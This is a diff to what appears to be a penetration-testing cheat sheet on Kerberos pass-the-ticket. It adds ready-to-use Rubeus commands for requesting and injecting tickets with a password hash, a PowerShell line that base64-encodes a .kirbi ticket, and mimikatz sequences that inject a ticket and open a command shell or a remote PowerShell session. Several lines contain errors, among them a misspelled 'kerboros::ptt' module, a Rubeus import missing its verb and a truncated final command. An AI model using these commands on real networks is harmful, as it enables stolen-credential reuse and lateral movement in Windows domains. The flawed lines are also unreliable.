@@ -37,5 +37,29 @@ Rubeus.exe asktgt /domain: <domain> /user: <username> /<rc4/aes128/aes256>: <has
 ```
 -Using Rubeus (Auto Import Ticket to current session):
 ```
-Rubeus.exe asktgt /domain: <domain> /user: <username> /<rc4/aes128/aes256>
+Rubeus.exe asktgt /domain: <domain> /user: <username> /<rc4/aes128/aes256>: <hash> /ptt
+```
+-Using Rubeus to import ticket from .kirbi file:
+```
+Rubeus.exe ptt /ticket: <ticketfile>
+```
+-We can use powershell to convert .kirbi to Base64 format and then import it with Rubeus:
+```
+ [Convert]::ToBase64String([IO.File]::ReadAllBytes("<.kirbi_file>"))
+ Rubeus.exe /ticket:<base64_ticket>
+```
+-Pass the ticket and open cmd session with mimikatz:
+```
+mimikatz.exe
+privilege::debug
+kerboros::ptt "<abspath_to_ticket>"
+misc::cmd
+```
+-Pass the ticket and open PS-Session on another machine with mimikatz:
+```
+mimikatz.exe
+privilege::debug
+kerboros::ptt "<abspath_to_ticket>"
+exit
+PS: Enter-PSSession -ComputerName 
 ```
